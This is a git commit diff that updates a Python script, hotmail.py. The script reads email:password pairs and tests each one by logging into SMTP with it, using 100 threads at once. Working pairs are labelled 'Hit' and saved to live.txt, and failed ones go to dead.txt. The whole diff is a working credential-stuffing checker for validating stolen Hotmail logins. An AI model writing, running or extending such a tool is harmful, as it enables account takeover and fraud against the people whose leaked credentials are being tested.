e0418a92a89df2daf5e9221399ae82c5cf4be981
tonystark-69 <mark69.kop1@gmail.com>
2024-08-11 00:22:06 +0600

    Update hotmail.py

--- hotmail.py
+++ hotmail.py
@@ -1,6 +1,10 @@
 import smtplib
 import traceback
 import concurrent.futures
+from colorama import Fore
+
+live = open('live.txt', 'w')
+dead = open('dead.txt', 'w')
 
 def check(subject, body, to_email, sender_email, sender_password):
     try:
@@ -19,7 +23,35 @@ def check(subject, body, to_email, sender_email, sender_password):
     except Exception as e:
         error_message = f"{str(e)}\n{traceback.format_exc()}"
         return error_message
-
+    
 def check_emailpass(emailpass):
+    global live
+    global dead
     e = str(emailpass).split(':')
-    return emailpass, check('Checking...', 'Checking...', e[0], e[0], e[1])
+    c = check('Checking...', 'Checking...', e[0], e[0], e[1])
+    if c is None:
+        with open('live.txt', 'a') as file:
+            file.write(emailpass)
+        return 'Hit', emailpass
+    else:
+        with open('dead.txt', 'a') as file:
+            file.write(emailpass)
+        return 'Dead', c
+
+def process_hotmail(file_content):
+    emails = file_content.splitlines()
+    hits = []
+    dead = []
+    total = len(emails)
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+        results = list(executor.map(check_emailpass, emails))
+    
+    for result in results:
+        status, message = result
+        if status == 'Hit':
+            hits.append(message)
+        else:
+            dead.append(message)
+    
+    return total, len(hits), len(dead)
